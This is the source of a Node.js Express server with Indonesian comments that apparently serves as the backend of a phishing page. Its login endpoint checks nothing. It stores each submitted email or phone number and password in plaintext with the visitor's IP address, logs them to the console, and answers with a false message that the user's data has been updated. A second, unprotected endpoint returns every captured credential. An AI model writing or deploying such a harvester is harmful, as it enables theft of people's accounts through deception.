const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const DATA_FILE = path.join(__dirname, 'data.json');

// Baca data dari file
function readData() {
    if (!fs.existsSync(DATA_FILE)) return [];
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE));
    } catch (err) {
        return [];
    }
}

// Simpan data ke file
function saveData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Endpoint login
app.post('/api/login', (req, res) => {
    const { emailOrPhone, password } = req.body;
    if (!emailOrPhone || !password) {
        return res.status(400).json({ error: 'Harap isi semua field' });
    }

    const logins = readData();
    logins.push({
        id: logins.length + 1,
        emailOrPhone,
        password,
        ip: req.ip || req.socket.remoteAddress,
        timestamp: new Date().toISOString()
    });
    saveData(logins);

    console.log(`📥 Tersimpan: ${emailOrPhone} | ${password}`);
    res.json({ success: true, message: 'Terima kasih. Data Anda sudah diperbaharui di dalam sistem kami.' });
});

// (Opsional) lihat semua data
app.get('/api/data', (req, res) => {
    res.json(readData());
});

// Halaman utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
});